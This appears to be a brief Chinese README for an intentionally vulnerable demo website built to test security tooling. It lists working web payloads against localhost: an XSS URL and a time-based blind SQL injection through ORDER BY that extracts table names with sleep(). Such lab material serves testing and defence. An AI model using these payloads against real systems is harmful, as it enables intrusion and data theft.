创建此仓库是为了测试安全工具开发而写的存在漏洞的demo网站

payload:

SQL注入支持json，post，get传参where注入

xss

http://127.0.0.1/xss.php?name=\&age=-alert(1)//

order by注入

select * from user ORDER BY id,if((select (SUBSTR((SELECT table_name FROM information_schema.TABLES WHERE table_schema=(SELECT DATABASE()) limit 1),1,1)='u')),sleep(1),0)

http://127.0.0.1/orderby.php?orderby=,if((select%20(SUBSTR((SELECT%20table_name%20FROM%20information_schema.TABLES%20WHERE%20table_schema=(SELECT%20DATABASE())%20limit%201),1,1)=%27u%27)),sleep(1),0)

